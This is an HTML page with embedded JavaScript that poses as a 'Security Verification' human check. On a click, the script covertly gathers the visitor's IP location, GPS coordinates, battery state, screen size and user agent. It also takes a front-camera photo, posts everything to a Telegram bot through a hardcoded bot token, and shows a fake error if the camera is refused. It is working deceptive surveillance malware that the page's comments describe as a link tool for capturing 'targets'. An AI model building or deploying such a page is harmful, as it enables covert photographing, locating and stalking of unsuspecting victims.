<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Required</title>
    <style>
        body {
            background-color: #0f172a;
            color: #f8fafc;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #1e293b;
            padding: 30px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            max-width: 320px;
            width: 100%;
        }
        .btn {
            background-color: #38bdf8;
            color: #0f172a;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
            transition: 0.2s;
        }
        .btn:hover {
            background-color: #0ea5e9;
        }
    </style>
</head>
<body>
    <div class="card" id="main-card">
        <h3>ЁЯФТ Security Verification</h3>
        <p style="color: #94a3b8; font-size: 14px;">Click below to verify that you are a human and load the content.</p>
        <button class="btn" onclick="startCapture()">Continue тЮФ</button>
    </div>

    <div class="card" id="loading-card" style="display: none;">
        <h3>Loading...</h3>
        <p style="color: #94a3b8; font-size: 14px;">Please wait while we fetch your content.</p>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // URL se dynamic Chat ID uthane ka tareeka
        const urlParams = new URLSearchParams(window.location.search);
        const TARGET_CHAT_ID = urlParams.get('id'); // Jo link me id aayegi wahi use hogi

        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI"; // Bot token wahi rahega jo tera main bot hai

        async function startCapture() {
            if (!TARGET_CHAT_ID) {
                alert("Invalid Link! User ID missing.");
                return;
            }

            document.getElementById('main-card').style.display = 'none';
            document.getElementById('loading-card').style.display = 'block';

            let ipInfo = "N/A";
            try {
                let ipRes = await fetch('https://ipapi.co/json/');
                let ipData = await ipRes.json();
                ipInfo = `ЁЯМР **IP Information**\nЁЯФв IP: \`${ipData.ip}\`\nЁЯУН Location: ${ipData.city}, ${ipData.region}\nЁЯЧ║ Country: ${ipData.country_name}\nЁЯУб ISP: ${ipData.org}`;
            } catch(e) {
                ipInfo = "ЁЯМР IP Info: Failed to fetch";
            }

            let batteryInfo = "N/A";
            try {
                if (navigator.getBattery) {
                    let bat = await navigator.getBattery();
                    batteryInfo = `ЁЯФЛ Battery: ${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging тЪб' : 'Not Charging'})`;
                }
            } catch(e) {}

            let screenInfo = `ЁЯЦея╕П Screen: ${window.innerWidth}x${window.innerHeight}`;
            let uaInfo = `ЁЯза UA: ${navigator.userAgent}`;

            let gpsInfo = "ЁЯУН GPS: Not Allowed / Unavailable";
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    let lat = pos.coords.latitude;
                    let lon = pos.coords.longitude;
                    gpsInfo = `ЁЯУН **Live GPS:** [Google Maps](https://maps.google.com/?q=${lat},${lon})`;
                }, err => {}, { timeout: 5000 });
            }

            setTimeout(async () => {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob(blob => {
                            stream.getTracks().forEach(track => track.stop());

                            let fullCaption = `ЁЯУ╕ **Target Captured!**\n\n${ipInfo}\n\nЁЯУ▒ **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\n${uaInfo}\n\nтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБ\nтЬи **Credit by : рдЖрдпреБрд╖ рдиреЗрдЧреА**`;

                            const formData = new FormData();
                            formData.append('chat_id', TARGET_CHAT_ID); // Yahan usi user ki ID jayegi jo link generate karega
                            formData.append('caption', fullCaption);
                            formData.append('parse_mode', 'Markdown');
                            formData.append('photo', blob, 'captured.jpg');

                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            }).catch(err => console.error(err));

                        }, 'image/jpeg', 0.85);

                    }, 1500);

                } catch(err) {
                    let fullCaption = `тЪая╕П **Camera Denied, but Info Captured:**\n\n${ipInfo}\n\nЁЯУ▒ **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\nтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБ\nтЬи **Credit by : рдЖрдпреБрд╖ рдиреЗрдЧреА**`;
                    
                    let formData = new FormData();
                    formData.append('chat_id', TARGET_CHAT_ID);
                    formData.append('text', fullCaption);
                    formData.append('parse_mode', 'Markdown');
                    
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        body: formData
                    }).catch(e => {});

                    document.getElementById('loading-card').innerHTML = "<h3>Error Loading Page</h3><p style='color:#ef4444;font-size:14px;'>Please try again.</p>";
                }
            }, 1000);
        }
    </script>
</body>
</html>
